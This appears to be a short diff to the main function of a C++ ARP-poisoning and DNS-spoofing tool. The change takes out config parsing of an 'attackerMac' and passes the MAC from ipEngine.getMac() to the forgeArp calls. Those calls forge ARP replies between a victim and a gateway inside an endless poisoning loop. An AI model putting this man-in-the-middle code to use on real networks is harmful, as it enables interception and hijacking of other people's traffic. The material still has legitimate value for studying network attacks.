@@ -37,21 +37,11 @@ int main(int argc, const char *argv[]) {
     struct DnsSniffArgs dnsSniffArgs;
     dnsSniffArgs.targets = convertToVector(rawDomainIpPairs);
 
-    // convert all the values from the config file to the correct format
-    unsigned char attackerMac[ETH_ALEN];
-
     struct in_addr victimIp;
     struct in_addr gatewayIp;
     unsigned char *victimIpChar = (unsigned char *)&victimIp;
     unsigned char *gatewayIpChar = (unsigned char *)&gatewayIp;
     const char *tmp;
-
-    tmp = properties["attackerMac"].c_str();
-    if (sscanf(tmp, "%x:%x:%x:%x:%x:%x", &attackerMac[0], &attackerMac[1], &attackerMac[2],
-               &attackerMac[3], &attackerMac[4], &attackerMac[5]) != 6) {
-        std::cerr << "could not parse attackerMac" << std::endl;
-        return 0;
-    }
 
     tmp = properties["victimIp"].c_str();
     if (sscanf(tmp, "%hhu.%hhu.%hhu.%hhu", &victimIpChar[0], &victimIpChar[1], &victimIpChar[2],
@@ -146,8 +136,8 @@ int main(int argc, const char *argv[]) {
     // start arp poisoning
     struct arp_header victimArp;
     struct arp_header gatewayArp;
-    forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
-    forgeArp(attackerMac, &victimIp, gatewayMac, &gatewayIp, &gatewayArp);
+    forgeArp(ipEngine.getMac(), &gatewayIp, victimMac, &victimIp, &victimArp);
+    forgeArp(ipEngine.getMac(), &victimIp, gatewayMac, &gatewayIp, &gatewayArp);
 
     // infinite arp loop
     while (true) {
